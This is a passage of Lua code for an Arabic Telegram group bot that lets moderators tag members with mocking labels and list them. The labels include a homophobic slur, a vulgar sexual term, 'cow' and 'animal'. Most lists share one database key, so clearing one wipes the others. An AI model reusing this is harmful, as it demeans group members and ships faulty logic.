send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Girl:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
local  statuss  = '\n ◉ تم رفع خول في الجروب\n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل خول")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Girl:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
status  = '\n ◉ تم تنزيل خول من الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'مسح البقرات' and Mod(msg) then
database:del(bot_id..'Bakra:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ◉ تم تنزيل جميع البقرات بالجروب')
end
if text == ("تاك للبقرات") and Mod(msg) then
local list = database:smembers(bot_id..'Bakra:User'..msg.chat_id_)
t = "\n ◉ قائمة البقرات الجروب \n•━═━═━═『𝙰𝚕𝚏𝚊』═━═━═━•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← البقره [@"..username.."]\n"
else
t = t..""..k.."← البقره "..v.."\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد البقره"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع بقره") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Bakra:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
local  statuss  = '\n ◉ تم رفع بقره في الجروب\n ◉ ها يالهايشه تع احلبك'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل بقره")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Bakra:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
status  = '\n ◉ تم تنزيل بقره من الجروب\n ◉ تعال هاك حليب مالتك'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'مسح المزز' and Mod(msg) then
database:del(bot_id..'Tele:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ◉ تم تنزيل جميع المزز بالجروب')
end
if text == ("تاك للمزز") and Mod(msg) then
local list = database:smembers(bot_id..'Tele:User'..msg.chat_id_)
t = "\n ◉ قائمة مزز الجروب \n•━═━═━═『𝙰𝚕𝚏𝚊』═━═━═━•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← االمزه [@"..username.."]\n"
else
t = t..""..k.."← المزه "..v.."\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد مزز"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع مزه") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Tele:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ?? العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
local  statuss  = '\n ◉ تم رفع مزه في الجروب\n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل مزه")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Tele:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
status  = '\n ◉ تم تنزيل مزه من الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'مسح الاكساس' and Mod(msg) then
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ◉ تم تنزيل جميع االاكساس')
end
if text == ("تاك للاكساس") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n ◉ قائمة كساس الجروب \n◤━───━𝑬𝑳𝑴𝑼𝑺𝑳????━───━◥\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← االكس  [@"..username.."]\n"
else
t = t..""..k.."← الكس "..v.."\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد كس"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع كس") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ?? اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
local  statuss  = '\n ◉ تم رفع كس في الجروب\n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل كس")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ?? لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
status  = '\n ◉ تم تنزيل كس من الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'مسح قلبي' and Mod(msg) then
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ◉ تم تنزيل جميع القلوب ')
end
if text == ("تاك لقلبي") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n ◉ قائمة القلوب في الجروب\n•━═━═━═『𝙰𝚕𝚏𝚊』═━═━═━•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← قلبي [@"..username.."]\n"
else
t = t..""..k.."← قلبي "..v.."\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد قلوب"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع بقلبي") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
local  statuss  = '\n ◉ تم رفع بقلبي في الجروب\n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل بقلبي")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
status  = '\n ◉ تم تنزيل بقلبي من الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'مسح ابني' and Mod(msg) then
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ◉ تم تنزيل جميع أولادي')
end
if text == ("تاك لولادي") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n ◉ قائمة اولاد الجروب \n•━═━═━═『𝙰𝚕𝚏𝚊』═━═━═━•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← ابني [@"..username.."]\n"
else
t = t..""..k.."← ابني "..v.."\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد ابني"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع ابني") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
local  statuss  = '\n ◉ تم رفع ابني في الجروب\n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل ابني")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
status  = '\n ◉ تم تنزيل ابني من الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'مسح بنتي' and Mod(msg) then
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ◉ تم تنزيل جميع االاكساس')
end
if text == ("تاك لبناتي") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n ◉ قائمة بناتي الجروب \n•━═━═━═『𝙰𝚕𝚏𝚊』═━═━═━•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← بنتي [@"..username.."]\n"
else
t = t..""..k.."← بنتي"..v.."\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد بنات"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع بنتي") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
local  statuss  = '\n ◉ تم رفع بنتي في الجروب\n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل بنتي")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
status  = '\n ◉ تم تنزيل بنتي من الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'مسح القطط' and Mod(msg) then
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ◉ تم تنزيل جميع الخاينين')
end
if text == ("تاك للقطط") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n ◉ قائمة قطط الجروب \n•━═━═━═『𝙰𝚕𝚏𝚊』═━═━═━•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← قطه [@"..username.."]\n"
else
t = t..""..k.."← قطه"..v.."\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد قطط"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع قطتي") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
local  statuss  = '\n ◉ تم رفع قطتي في الجروب\n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل قطتي")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
status  = '\n ◉ تم تنزيل قطتي من الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'مسح دكراتي' and Mod(msg) then
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ◉ تم تنزيل جميع الخاينين')
end
if text == ("تاك لدكراتي") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n ◉ قائمة دكرات الجروب \n•━═━═━═『𝙰𝚕𝚏𝚊』═━═━═━•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← دكر [@"..username.."]\n"
else
t = t..""..k.."← دكر"..v.."\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد دكره"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع دكري") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
local  statuss  = '\n ◉ تم رفع دكري ف الجروب\n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل دكري")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
status  = '\n ◉ تم تنزيل دكري من الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'مسح الفشله' and Mod(msg) then
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ◉ تم تنزيل جميع الخاينين')
end
if text == ("تاك للفشله") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n ◉ قائمة فاشلين الجروب \n•━═━═━═『𝙰𝚕𝚏𝚊』═━═━═━•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← فاشل [@"..username.."]\n"
else
t = t..""..k.."← فاشل"..v.."\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد فشله"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع فاشل") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
local  statuss  = '\n ◉ تم رفع فاشل في الجروب\n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل فاشل")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
status  = '\n ◉ تم تنزيل فاشل من الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'مسح الحيوانات' and Mod(msg) then
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ◉ تم تنزيل جميع الخاينين')
end
if text == ("تاك للحيوانات") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n ◉ قائمة حيوانات الجروب \n•━═━═━═『𝙰𝚕𝚏𝚊』═━═━═━•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← حيوان [@"..username.."]\n"
else
t = t..""..k.."← حيوان"..v.."\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد حيوانات"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع حيوان") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
